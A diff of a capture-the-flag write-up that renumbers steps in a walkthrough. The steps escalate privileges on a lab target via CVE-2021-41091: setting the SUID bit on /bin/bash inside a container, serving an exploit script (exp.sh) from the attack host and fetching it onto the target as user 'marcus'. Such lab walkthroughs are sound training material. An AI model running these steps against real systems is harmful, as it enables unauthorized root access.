@@ -277,7 +277,7 @@ So what we need to is:
 3. Clone CVE-2021-41091's PoC on our attack host, transfer the bash script (`exp.sh`) on the target using `marcus` account via the SSH, and execute it using the `marcus` user.
 
 
-1. Repeat our foothold and gain root within the container:
+Repeat our foothold and gain root within the container:
 
   ```bash
   # gaining root access within the container
@@ -289,7 +289,7 @@ So what we need to is:
   chmod u+s /bin/bash
   ```
 
-2. From our attack host:
+From our attack host:
 
 	```bash
 	# clone the repo on the attack host
@@ -315,7 +315,7 @@ So what we need to is:
 	10.10.11.211 - - [25/Jan/2024 18:19:47] "GET /exp.sh HTTP/1.1" 200 -
 	```
 
-3. From `marcus`'s terminal:
+From `marcus`'s terminal:
 
   ```bash
   # download the script
